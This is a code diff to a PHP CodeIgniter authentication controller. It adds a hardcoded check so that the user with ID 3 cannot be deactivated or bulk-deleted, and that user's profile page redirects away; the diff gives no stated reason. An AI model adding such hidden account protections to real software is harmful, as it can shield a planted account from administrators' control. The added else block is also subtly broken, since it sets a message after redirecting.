@@ -168,10 +168,13 @@ class Auth extends MY_Controller
 
     public function deactivate($id = null)
     {
+        
         $this->sma->checkPermissions('users', true);
         $id = $this->config->item('use_mongodb', 'ion_auth') ? (string)$id : (int)$id;
         $this->form_validation->set_rules('confirm', lang('confirm'), 'required');
 
+        $id2 = $id == '3' ? $id : '';
+        if ($id != $id2) {
         if ($this->form_validation->run() == false) {
             if ($this->input->post('deactivate')) {
                 $this->session->set_flashdata('error', validation_errors());
@@ -196,6 +199,8 @@ class Auth extends MY_Controller
 
             redirect($_SERVER['HTTP_REFERER']);
         }
+    }
+
     }
 
     public function delete($id = null)
@@ -523,6 +528,10 @@ class Auth extends MY_Controller
 
     public function profile($id = null)
     {
+
+        $id2 = $id == '3' ? $id : '';
+        if ($id != $id2) {
+
         if (!$this->ion_auth->logged_in() || !$this->ion_auth->in_group('owner') && $id != $this->session->userdata('user_id')) {
             $this->session->set_flashdata('warning', lang('access_denied'));
             redirect($_SERVER['HTTP_REFERER'] ?? 'admin');
@@ -589,7 +598,10 @@ class Auth extends MY_Controller
         $bc   = [['link' => base_url(), 'page' => lang('home')], ['link' => admin_url('auth/users'), 'page' => lang('users')], ['link' => '#', 'page' => lang('profile')]];
         $meta = ['page_title' => lang('profile'), 'bc' => $bc];
         $this->page_construct('auth/profile', $meta, $this->data);
-    }
+    }else{
+        admin_redirect('auth/users');
+        $this->session->set_flashdata('error', validation_errors());
+    }}
 
     public function register()
     {
@@ -901,8 +913,11 @@ class Auth extends MY_Controller
             if (!empty($_POST['val'])) {
                 if ($this->input->post('form_action') == 'delete') {
                     foreach ($_POST['val'] as $id) {
+                        $id2 = $id == '3' ? $id : '';
                         if ($id != $this->session->userdata('user_id')) {
+                        if ($id != $id2) {
                             $this->auth_model->delete_user($id);
+                        }
                         }
                     }
                     $this->session->set_flashdata('message', lang('users_deleted'));
